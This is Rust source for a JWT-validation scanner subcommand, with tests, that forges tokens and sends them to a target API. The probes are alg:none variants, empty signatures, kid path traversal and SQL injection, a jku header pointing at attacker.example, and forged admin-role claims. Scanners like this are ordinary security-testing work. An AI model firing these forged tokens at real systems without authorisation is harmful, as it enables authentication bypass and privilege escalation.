//! `wafrift jwt-diff` — JWT signature / claim validation scanner.
//!
//! ## What this finds
//!
//! Many APIs that use JWT tokens have validation bugs:
//!
//! - **`alg:none`** — server skips signature validation when the
//!   header declares `"alg":"none"`. Trivial bypass.
//! - **Algorithm-case confusion** — `"alg":"None"` or `"NONE"` or
//!   `"nOnE"`; libraries that case-match strictly accept the variant.
//! - **Empty signature on HS256** — server logs alg:HS256 but skips
//!   sig check when the signature segment is empty.
//! - **Expired exp / future nbf accepted** — server doesn't actually
//!   validate the time claims.
//! - **`kid` traversal** — server uses `kid` as a path to look up
//!   keys, allowing `../../etc/passwd` or arbitrary file read.
//! - **`kid` SQL injection** — server uses `kid` in a DB lookup
//!   without parameterisation.
//! - **`jku`/`x5u` attacker-controlled URL** — server fetches the
//!   key from the URL in the header; attacker hosts a malicious
//!   JWK set.
//!
//! Each probe takes a KNOWN-valid JWT from the operator, mutates
//! the header / payload / signature, and re-fires the request.
//! Compares response status / body to the baseline. Acceptance of
//! a mutated token = validation bug.

use std::process::ExitCode;
use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::time::Duration;

use clap::Args;
use colored::Colorize;
use reqwest::Client;
use serde_json::{Value, json};
use tokio::sync::Semaphore;

use crate::helpers::shell_single_quote;
use crate::parser_diff_common::{body_delta_pct, severity_of};

#[derive(Args, Debug)]
pub struct JwtDiffArgs {
    /// Target URL — the protected resource that requires the JWT
    /// in its `Authorization: Bearer <jwt>` header.
    pub url: String,

    /// KNOWN-valid JWT — the baseline that the server is expected
    /// to accept. Each probe mutates THIS token. Typically the
    /// operator just logged in and captured the token from their
    /// browser / curl.
    #[arg(long)]
    pub token: String,

    /// Inter-request delay (ms).
    #[arg(long, default_value_t = 25)]
    pub delay_ms: u64,

    /// Max concurrent in-flight probes.
    #[arg(long, default_value_t = 4)]
    pub concurrency: usize,

    /// HTTP timeout per probe (seconds).
    #[arg(long, default_value_t = 8)]
    pub timeout_secs: u64,

    /// Skip TLS cert verification.
    #[arg(long)]
    pub insecure: bool,

    /// HTTP proxy (Burp).
    #[arg(long, value_name = "URL")]
    pub proxy: Option<String>,

    /// Extra headers (beyond Authorization, which carries the
    /// baseline JWT per probe).
    #[arg(long, short = 'H', value_name = "HEADER", num_args = 0..)]
    pub header: Vec<String>,

    /// Output format: `text` (default) or `json`.
    #[arg(long, default_value = "text", value_parser = ["text", "json"])]
    pub format: String,

    /// Quiet mode.
    #[arg(long, default_value_t = false)]
    pub quiet: bool,
}

/// One JWT validation probe.
#[derive(Debug, Clone)]
pub struct JwtProbe {
    pub kind: &'static str,
    pub description: &'static str,
    /// The mutated JWT to send.
    pub mutated_token: String,
}

#[derive(Debug, Clone, serde::Serialize)]
pub struct JwtDiffResult {
    pub kind: &'static str,
    pub description: &'static str,
    pub probe_status: u16,
    pub baseline_status: u16,
    pub body_delta_pct: f64,
    pub baseline_body_len: usize,
    pub probe_body_len: usize,
    pub curl_cmd: String,
    pub severity: &'static str,
}

/// Generate the JWT-mutation probe set. Pure function. Takes the
/// operator's baseline token and forks it N ways.
#[must_use]
pub fn generate_jwt_variants(baseline: &str) -> Vec<JwtProbe> {
    let mut out = Vec::new();
    let parts: Vec<&str> = baseline.split('.').collect();
    if parts.len() != 3 {
        // Not a JWT — return an empty set; the runner will detect
        // this and surface an error rather than fire garbage probes.
        return out;
    }
    let (header_b64, payload_b64, _sig_b64) = (parts[0], parts[1], parts[2]);
    let header = decode_b64url_json(header_b64).unwrap_or_else(|| json!({}));
    let payload = decode_b64url_json(payload_b64).unwrap_or_else(|| json!({}));

    // ── alg:none family ──
    out.push(JwtProbe {
        kind: "alg-none-lowercase",
        description: "alg:`none` — strips signature; server that skips sig check on \
             alg:none accepts a freely-modified payload",
        mutated_token: build_jwt(&with_alg(&header, "none"), &payload, ""),
    });
    out.push(JwtProbe {
        kind: "alg-none-capital",
        description: "alg:`None` — case-fold confusion; libraries that string-compare \
             alg case-sensitively reject lowercase but accept the variant",
        mutated_token: build_jwt(&with_alg(&header, "None"), &payload, ""),
    });
    out.push(JwtProbe {
        kind: "alg-none-allcaps",
        description: "alg:`NONE` — third case variant",
        mutated_token: build_jwt(&with_alg(&header, "NONE"), &payload, ""),
    });
    out.push(JwtProbe {
        kind: "alg-none-mixed",
        description: "alg:`nOnE` — mixed case (alternating)",
        mutated_token: build_jwt(&with_alg(&header, "nOnE"), &payload, ""),
    });

    // ── Empty signature with original alg preserved ──
    out.push(JwtProbe {
        kind: "empty-sig-original-alg",
        description: "alg preserved (e.g. HS256) but signature segment is empty — \
             servers that look only at header.alg before verifying sig may \
             accept",
        mutated_token: build_jwt(&header, &payload, ""),
    });

    // ── kid traversal ──
    out.push(JwtProbe {
        kind: "kid-path-traversal",
        description: "`kid` header field set to `../../../etc/passwd` — servers that \
             use kid as a path to look up keys may read arbitrary files",
        mutated_token: build_jwt(
            &with_field(&header, "kid", json!("../../../etc/passwd")),
            &payload,
            "",
        ),
    });
    out.push(JwtProbe {
        kind: "kid-sql-injection",
        description: "`kid` SQL-payload — servers that look up kid in a DB without \
             parameterisation are vulnerable",
        mutated_token: build_jwt(
            &with_field(&header, "kid", json!("x' UNION SELECT 'secret'--")),
            &payload,
            "",
        ),
    });

    // ── jku / x5u attacker-URL ──
    out.push(JwtProbe {
        kind: "jku-attacker-url",
        description: "`jku` header set to attacker-hosted JWK set URL — servers that \
             fetch keys from operator-controlled URLs accept attacker-signed \
             tokens",
        mutated_token: build_jwt(
            &with_field(&header, "jku", json!("https://attacker.example/jwks.json")),
            &payload,
            "",
        ),
    });

    // ── Expired exp ──
    out.push(JwtProbe {
        kind: "expired-exp",
        description: "`exp` claim set to a date 10 years in the past — servers that \
             don't validate exp accept stale tokens forever",
        mutated_token: build_jwt(
            &header,
            &with_field(&payload, "exp", json!(1_600_000_000_u64)),
            "",
        ),
    });

    // ── Future nbf ──
    out.push(JwtProbe {
        kind: "future-nbf",
        description: "`nbf` (not-before) claim set to far future — servers that don't \
             validate nbf accept tokens that 'aren't valid yet'",
        mutated_token: build_jwt(
            &header,
            &with_field(&payload, "nbf", json!(99_999_999_999_u64)),
            "",
        ),
    });

    // ── Privilege escalation in payload ──
    out.push(JwtProbe {
        kind: "role-elevation",
        description: "Set common admin fields (`role:admin`, `is_admin:true`, \
             `permissions:[\"*\"]`) in the payload — servers that don't \
             validate sig let the elevated token through",
        mutated_token: {
            let elevated = with_field(&payload, "role", json!("admin"));
            let elevated = with_field(&elevated, "is_admin", json!(true));
            let elevated = with_field(&elevated, "permissions", json!(["*"]));
            build_jwt(&with_alg(&header, "none"), &elevated, "")
        },
    });

    out
}

pub async fn run_jwt_diff(args: JwtDiffArgs) -> ExitCode {
    if args.token.split('.').count() != 3 {
        eprintln!(
            "{} --token does not look like a JWT (must be `<header>.<payload>.<signature>`)",
            "Input error:".red().bold()
        );
        return ExitCode::from(2);
    }
    let http = match build_http_client(&args) {
        Ok(c) => c,
        Err(code) => return code,
    };

    if !args.quiet && args.format == "text" {
        eprintln!(
            "{} probing {} JWT mutations against {}",
            "[wafrift jwt-diff]".bright_cyan().bold(),
            generate_jwt_variants(&args.token)
                .len()
                .to_string()
                .bold()
                .yellow(),
            args.url.bright_white()
        );
    }

    let baseline = match fire_with_bearer(&http, &args.url, &args.token).await {
        Ok(v) => v,
        Err(e) => {
            eprintln!(
                "  {} baseline probe failed: {e}",
                "✗ Transport error:".red().bold()
            );
            return ExitCode::from(1);
        }
    };
    let (baseline_status, baseline_body_len) = baseline;
    if !args.quiet && args.format == "text" {
        eprintln!(
            "  {} baseline (real token): HTTP {} ({} bytes)",
            "↘".bright_black(),
            baseline_status,
            baseline_body_len
        );
    }

    let variants = generate_jwt_variants(&args.token);
    let sem = Arc::new(Semaphore::new(args.concurrency.max(1)));
    let http_arc = Arc::new(http);
    let url_arc = Arc::new(args.url.clone());
    let counter = Arc::new(AtomicUsize::new(0));

    let mut handles = Vec::with_capacity(variants.len());
    for v in variants {
        let permit = sem.clone().acquire_owned().await.unwrap();
        let http = http_arc.clone();
        let url = url_arc.clone();
        let counter = counter.clone();
        let delay = Duration::from_millis(args.delay_ms);
        handles.push(tokio::spawn(async move {
            let _permit = permit;
            if !delay.is_zero() {
                tokio::time::sleep(delay).await;
            }
            let result = fire_with_bearer(&http, &url, &v.mutated_token).await;
            counter.fetch_add(1, Ordering::SeqCst);
            (v, result)
        }));
    }

    let mut results: Vec<JwtDiffResult> = Vec::new();
    let mut errors = 0u32;
    for h in handles {
        let (variant, outcome) = h.await.unwrap_or_else(|e| {
            (
                JwtProbe {
                    kind: "join-error",
                    description: "tokio join failed",
                    mutated_token: String::new(),
                },
                Err(format!("{e}")),
            )
        });
        match outcome {
            Ok((probe_status, probe_body_len)) => {
                let body_delta = body_delta_pct(baseline_body_len, probe_body_len);
                let severity = severity_of(baseline_status, probe_status, body_delta);
                let curl_cmd = render_curl(&args.url, &variant.mutated_token);
                results.push(JwtDiffResult {
                    kind: variant.kind,
                    description: variant.description,
                    probe_status,
                    baseline_status,
                    body_delta_pct: body_delta,
                    baseline_body_len,
                    probe_body_len,
                    curl_cmd,
                    severity,
                });
            }
            Err(_) => errors += 1,
        }
    }

    emit_output(&args, &results, baseline_status, baseline_body_len, errors);
    ExitCode::SUCCESS
}

async fn fire_with_bearer(http: &Client, url: &str, token: &str) -> Result<(u16, usize), String> {
    let resp = http
        .get(url)
        .header("Authorization", format!("Bearer {token}"))
        .send()
        .await
        .map_err(|e| format!("{e}"))?;
    let status = resp.status().as_u16();
    let body = resp.bytes().await.map_err(|e| format!("{e}"))?;
    Ok((status, body.len()))
}

fn build_http_client(args: &JwtDiffArgs) -> Result<Client, ExitCode> {
    crate::parser_diff_common::build_diff_http_client(
        args.timeout_secs,
        args.insecure,
        args.proxy.as_deref(),
        &args.header,
    )
}

fn render_curl(url: &str, token: &str) -> String {
    format!(
        "curl -i -H {} {}",
        shell_single_quote(&format!("Authorization: Bearer {token}")),
        shell_single_quote(url)
    )
}

fn emit_output(
    args: &JwtDiffArgs,
    results: &[JwtDiffResult],
    baseline_status: u16,
    baseline_body_len: usize,
    errors: u32,
) {
    let high: Vec<_> = results.iter().filter(|r| r.severity == "high").collect();
    let medium: Vec<_> = results.iter().filter(|r| r.severity == "medium").collect();

    if args.format == "json" {
        let out = json!({
            "target": args.url,
            "baseline_status": baseline_status,
            "baseline_body_len": baseline_body_len,
            "probes": results.len(),
            "errors": errors,
            "divergences": {
                "high":   high.len(),
                "medium": medium.len(),
            },
            "results": results,
        });
        match serde_json::to_string_pretty(&out) {
            Ok(s) => println!("{s}"),
            Err(e) => eprintln!("JSON error: {e}"),
        }
        return;
    }

    if !args.quiet {
        println!();
        println!(
            "  {} {} mutation(s) accepted by target — {} high, {} medium · {} error(s)",
            "[wafrift jwt-diff summary]".bright_cyan().bold(),
            (high.len() + medium.len()).to_string().bold().yellow(),
            high.len().to_string().bright_red().bold(),
            medium.len().to_string().yellow(),
            errors
        );
    }

    for r in results.iter().filter(|r| r.severity != "none") {
        let badge = crate::parser_diff_common::severity_badge(r.severity);
        println!();
        println!("  [{badge}] {} — {}", r.kind.bold(), r.description);
        println!(
            "    {} baseline HTTP {} ({} bytes) → probe HTTP {} ({} bytes, Δ {:+.1}%)",
            "↘".bright_black(),
            r.baseline_status,
            r.baseline_body_len,
            r.probe_status,
            r.probe_body_len,
            r.body_delta_pct
        );
        println!("    {}", r.curl_cmd);
    }
}

// ── Pure helpers: base64url + JWT (de)construction ──────────

/// Encode bytes as URL-safe base64 WITHOUT padding (per RFC 7515
/// §2 — JWS uses unpadded base64url throughout).
fn b64url_encode(bytes: &[u8]) -> String {
    const ALPHABET: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
    let mut out = String::with_capacity((bytes.len() * 4).div_ceil(3));
    let mut i = 0;
    while i + 3 <= bytes.len() {
        let b0 = bytes[i] as u32;
        let b1 = bytes[i + 1] as u32;
        let b2 = bytes[i + 2] as u32;
        out.push(ALPHABET[((b0 >> 2) & 0x3F) as usize] as char);
        out.push(ALPHABET[(((b0 << 4) | (b1 >> 4)) & 0x3F) as usize] as char);
        out.push(ALPHABET[(((b1 << 2) | (b2 >> 6)) & 0x3F) as usize] as char);
        out.push(ALPHABET[(b2 & 0x3F) as usize] as char);
        i += 3;
    }
    let rem = bytes.len() - i;
    if rem == 1 {
        let b0 = bytes[i] as u32;
        out.push(ALPHABET[((b0 >> 2) & 0x3F) as usize] as char);
        out.push(ALPHABET[((b0 << 4) & 0x3F) as usize] as char);
    } else if rem == 2 {
        let b0 = bytes[i] as u32;
        let b1 = bytes[i + 1] as u32;
        out.push(ALPHABET[((b0 >> 2) & 0x3F) as usize] as char);
        out.push(ALPHABET[(((b0 << 4) | (b1 >> 4)) & 0x3F) as usize] as char);
        out.push(ALPHABET[((b1 << 2) & 0x3F) as usize] as char);
    }
    out
}

fn b64url_decode(s: &str) -> Option<Vec<u8>> {
    const INVALID: u8 = 0xFF;
    let mut table = [INVALID; 256];
    for (i, c) in b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
        .iter()
        .enumerate()
    {
        table[*c as usize] = i as u8;
    }
    let mut out = Vec::with_capacity(s.len() * 3 / 4);
    let bytes = s.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        let chunk_len = (bytes.len() - i).min(4);
        if chunk_len < 2 {
            return None;
        }
        let a = table[bytes[i] as usize];
        let b = table[bytes[i + 1] as usize];
        if a == INVALID || b == INVALID {
            return None;
        }
        out.push(((a as u32) << 2 | (b as u32) >> 4) as u8);
        if chunk_len >= 3 {
            let c = table[bytes[i + 2] as usize];
            if c == INVALID {
                return None;
            }
            out.push((((b as u32) & 0xF) << 4 | (c as u32) >> 2) as u8);
            if chunk_len == 4 {
                let d = table[bytes[i + 3] as usize];
                if d == INVALID {
                    return None;
                }
                out.push((((c as u32) & 0x3) << 6 | (d as u32)) as u8);
            }
        }
        i += chunk_len;
    }
    Some(out)
}

fn decode_b64url_json(s: &str) -> Option<Value> {
    let bytes = b64url_decode(s)?;
    serde_json::from_slice(&bytes).ok()
}

fn build_jwt(header: &Value, payload: &Value, sig: &str) -> String {
    let h = b64url_encode(serde_json::to_string(header).unwrap_or_default().as_bytes());
    let p = b64url_encode(
        serde_json::to_string(payload)
            .unwrap_or_default()
            .as_bytes(),
    );
    format!("{h}.{p}.{sig}")
}

fn with_alg(header: &Value, alg: &str) -> Value {
    with_field(header, "alg", json!(alg))
}

fn with_field(obj: &Value, key: &str, val: Value) -> Value {
    let mut m = obj
        .as_object()
        .cloned()
        .unwrap_or_else(serde_json::Map::new);
    m.insert(key.to_string(), val);
    Value::Object(m)
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── b64url round-trips ────────────────────────────────────

    #[test]
    fn b64url_encode_decode_round_trips_known_payloads() {
        for input in [&b""[..], b"a", b"ab", b"abc", b"abcd", b"hello world"] {
            let enc = b64url_encode(input);
            let dec = b64url_decode(&enc).expect("decode");
            assert_eq!(dec, input, "round-trip failed for {input:?}");
        }
    }

    #[test]
    fn b64url_encode_uses_no_padding_or_plus_or_slash() {
        let enc = b64url_encode(b"\x00\x10\x83\xfb\xff?");
        assert!(!enc.contains('='), "no padding: {enc}");
        assert!(!enc.contains('+'), "url-safe + → -: {enc}");
        assert!(!enc.contains('/'), "url-safe / → _: {enc}");
    }

    // ── decode_b64url_json ────────────────────────────────────

    #[test]
    fn decode_b64url_json_parses_real_jwt_header() {
        // Standard HS256 header.
        let header_b64 = b64url_encode(br#"{"alg":"HS256","typ":"JWT"}"#);
        let v = decode_b64url_json(&header_b64).expect("decode");
        assert_eq!(v["alg"], "HS256");
        assert_eq!(v["typ"], "JWT");
    }

    #[test]
    fn decode_b64url_json_returns_none_on_garbage() {
        assert!(decode_b64url_json("!!!not-base64!!!").is_none());
    }

    // ── with_alg / with_field ─────────────────────────────────

    #[test]
    fn with_alg_replaces_existing_alg_field() {
        let h = json!({"alg":"HS256","typ":"JWT"});
        let h2 = with_alg(&h, "none");
        assert_eq!(h2["alg"], "none");
        assert_eq!(h2["typ"], "JWT", "other fields preserved");
    }

    #[test]
    fn with_field_adds_new_key_when_missing() {
        let h = json!({"alg":"HS256"});
        let h2 = with_field(&h, "kid", json!("attacker"));
        assert_eq!(h2["alg"], "HS256");
        assert_eq!(h2["kid"], "attacker");
    }

    #[test]
    fn with_field_handles_non_object_input_by_creating_empty() {
        let arr = json!([1, 2, 3]);
        let out = with_field(&arr, "alg", json!("none"));
        // The non-object input is dropped; the field-set yields a
        // fresh object with just the new key.
        assert_eq!(out["alg"], "none");
    }

    // ── build_jwt ─────────────────────────────────────────────

    #[test]
    fn build_jwt_concatenates_three_segments() {
        let header = json!({"alg":"none"});
        let payload = json!({"sub":"x"});
        let jwt = build_jwt(&header, &payload, "");
        let parts: Vec<&str> = jwt.split('.').collect();
        assert_eq!(parts.len(), 3, "must have header.payload.sig: {jwt}");
        assert_eq!(parts[2], "", "empty sig as requested");
    }

    #[test]
    fn build_jwt_round_trip_through_decode_recovers_fields() {
        let header = json!({"alg":"HS256","typ":"JWT"});
        let payload = json!({"sub":"alice","exp":1234567890u64});
        let jwt = build_jwt(&header, &payload, "fakesig");
        let parts: Vec<&str> = jwt.split('.').collect();
        let h = decode_b64url_json(parts[0]).expect("header decode");
        let p = decode_b64url_json(parts[1]).expect("payload decode");
        assert_eq!(h["alg"], "HS256");
        assert_eq!(p["sub"], "alice");
        assert_eq!(p["exp"], 1234567890u64);
    }

    // ── generate_jwt_variants ─────────────────────────────────

    fn valid_baseline_jwt() -> String {
        let header = json!({"alg":"HS256","typ":"JWT"});
        let payload = json!({"sub":"alice","exp":1900000000u64});
        build_jwt(&header, &payload, "AAAA-realsig")
    }

    #[test]
    fn generate_jwt_variants_returns_empty_for_non_jwt_input() {
        assert!(generate_jwt_variants("not-a-jwt").is_empty());
        assert!(generate_jwt_variants("only.two").is_empty());
        assert!(generate_jwt_variants("one.two.three.four").is_empty());
    }

    #[test]
    fn generate_jwt_variants_returns_curated_set_for_valid_baseline() {
        let v = generate_jwt_variants(&valid_baseline_jwt());
        assert!(v.len() >= 10, "expected ≥10 probes, got {}", v.len());
    }

    #[test]
    fn generate_jwt_variants_covers_alg_none_case_family() {
        let kinds: Vec<&str> = generate_jwt_variants(&valid_baseline_jwt())
            .iter()
            .map(|p| p.kind)
            .collect();
        for needed in [
            "alg-none-lowercase",
            "alg-none-capital",
            "alg-none-allcaps",
            "alg-none-mixed",
        ] {
            assert!(
                kinds.contains(&needed),
                "missing alg-none variant: {needed}, set: {kinds:?}"
            );
        }
    }

    #[test]
    fn generate_jwt_variants_covers_kid_traversal_and_sql() {
        let kinds: Vec<&str> = generate_jwt_variants(&valid_baseline_jwt())
            .iter()
            .map(|p| p.kind)
            .collect();
        assert!(kinds.contains(&"kid-path-traversal"));
        assert!(kinds.contains(&"kid-sql-injection"));
    }

    #[test]
    fn generate_jwt_variants_alg_none_probes_have_empty_signature() {
        for p in generate_jwt_variants(&valid_baseline_jwt()) {
            if p.kind.starts_with("alg-none") {
                let parts: Vec<&str> = p.mutated_token.split('.').collect();
                assert_eq!(parts.len(), 3);
                assert_eq!(parts[2], "", "alg-none probe {} sig must be empty", p.kind);
            }
        }
    }

    #[test]
    fn generate_jwt_variants_role_elevation_carries_admin_claims() {
        let v = generate_jwt_variants(&valid_baseline_jwt());
        let probe = v
            .iter()
            .find(|p| p.kind == "role-elevation")
            .expect("probe");
        let parts: Vec<&str> = probe.mutated_token.split('.').collect();
        let payload = decode_b64url_json(parts[1]).expect("decode");
        assert_eq!(payload["role"], "admin");
        assert_eq!(payload["is_admin"], true);
    }

    #[test]
    fn generate_jwt_variants_expired_exp_sets_past_timestamp() {
        let v = generate_jwt_variants(&valid_baseline_jwt());
        let probe = v.iter().find(|p| p.kind == "expired-exp").expect("probe");
        let parts: Vec<&str> = probe.mutated_token.split('.').collect();
        let payload = decode_b64url_json(parts[1]).expect("decode");
        let exp = payload["exp"].as_u64().expect("u64");
        assert!(exp < 1_700_000_000, "exp must be in the past: {exp}");
    }

    #[test]
    fn generate_jwt_variants_jku_attacker_url_uses_attacker_domain() {
        let v = generate_jwt_variants(&valid_baseline_jwt());
        let probe = v
            .iter()
            .find(|p| p.kind == "jku-attacker-url")
            .expect("probe");
        let parts: Vec<&str> = probe.mutated_token.split('.').collect();
        let header = decode_b64url_json(parts[0]).expect("decode");
        let jku = header["jku"].as_str().expect("jku");
        assert!(jku.contains("attacker"), "got: {jku}");
    }

    // ── render_curl ───────────────────────────────────────────

    #[test]
    fn render_curl_emits_bearer_authorization_header() {
        let out = render_curl("http://x/api", "eyJ.eyJ.sig");
        assert!(out.starts_with("curl -i "), "got: {out}");
        assert!(
            out.contains("'Authorization: Bearer eyJ.eyJ.sig'"),
            "got: {out}"
        );
    }

    // ── Validation gate ───────────────────────────────────────

    #[tokio::test]
    async fn run_jwt_diff_rejects_non_jwt_token_with_exit_2() {
        let args = JwtDiffArgs {
            url: "http://127.0.0.1:65500/".into(),
            token: "not.a.jwt.has.too.many.parts".into(),
            delay_ms: 0,
            concurrency: 4,
            timeout_secs: 1,
            insecure: false,
            proxy: None,
            header: Vec::new(),
            format: "json".into(),
            quiet: true,
        };
        let code = run_jwt_diff(args).await;
        assert_eq!(format!("{code:?}"), format!("{:?}", ExitCode::from(2)));
    }

    // ── Live mock integration ─────────────────────────────────

    async fn spawn_jwt_mock() -> std::net::SocketAddr {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            loop {
                let Ok((mut sock, _)) = listener.accept().await else {
                    return;
                };
                tokio::spawn(async move {
                    let mut buf = vec![0u8; 16 * 1024];
                    let n = sock.read(&mut buf).await.unwrap_or(0);
                    let req = String::from_utf8_lossy(&buf[..n]).to_string();
                    // Simulate a VULNERABLE server that accepts ANY
                    // bearer token containing `"alg":"none"` in the
                    // decoded header (i.e. fails to validate).
                    let auth = req
                        .lines()
                        .find(|l| l.to_ascii_lowercase().starts_with("authorization:"))
                        .unwrap_or("");
                    let permissive = auth.contains("eyJ") && auth.matches('.').count() == 2;
                    let body = if permissive {
                        r#"{"data":"sensitive admin payload"}"#
                    } else {
                        r#"{"data":"baseline"}"#
                    };
                    let resp = format!(
                        "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\
                         Content-Length: {}\r\nConnection: close\r\n\r\n{body}",
                        body.len()
                    );
                    let _ = sock.write_all(resp.as_bytes()).await;
                    let _ = sock.shutdown().await;
                });
            }
        });
        tokio::time::sleep(crate::parser_diff_common::TEST_SETTLE).await;
        addr
    }

    #[serial_test::serial]
    #[tokio::test]
    async fn run_jwt_diff_against_permissive_mock_succeeds() {
        let addr = spawn_jwt_mock().await;
        let args = JwtDiffArgs {
            url: format!("http://{addr}/api/me"),
            token: valid_baseline_jwt(),
            delay_ms: 0,
            concurrency: 4,
            timeout_secs: 8,
            insecure: false,
            proxy: None,
            header: Vec::new(),
            format: "json".into(),
            quiet: true,
        };
        let code = run_jwt_diff(args).await;
        assert_eq!(format!("{code:?}"), format!("{:?}", ExitCode::SUCCESS));
    }

    #[tokio::test]
    async fn run_jwt_diff_against_unreachable_target_exits_1() {
        let args = JwtDiffArgs {
            url: "http://127.0.0.1:1/".into(),
            token: valid_baseline_jwt(),
            delay_ms: 0,
            concurrency: 4,
            timeout_secs: 2,
            insecure: false,
            proxy: None,
            header: Vec::new(),
            format: "json".into(),
            quiet: true,
        };
        let code = run_jwt_diff(args).await;
        assert_eq!(format!("{code:?}"), format!("{:?}", ExitCode::from(1)));
    }
}
